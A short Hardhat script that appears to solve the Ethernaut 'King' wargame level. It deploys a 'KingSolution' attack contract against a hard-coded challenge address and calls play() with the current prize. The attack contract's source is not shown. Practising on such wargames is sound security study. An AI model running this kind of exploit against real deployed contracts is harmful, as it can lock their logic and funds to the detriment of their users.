const hre = require('hardhat');

async function main() {
  // Ethernaut level
  const kingContract = '0x20F500971eEEc9A8BC5DF41306Db401D712303D4';
  const [deployer] = await ethers.getSigners();

  console.log('Deploying contracts with the account:', deployer.address);
  console.log('Account balance:', (await deployer.getBalance()).toString());

  const KingSolution = await ethers.getContractFactory('KingSolution', deployer);
  const kingSolution = await KingSolution.deploy(kingContract);

  const King = await ethers.getContractFactory('King');
  const king = await King.attach(kingContract);
  const prize = await king.prize();

  const tx = await kingSolution.play({ value: prize });
  await tx.wait();
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
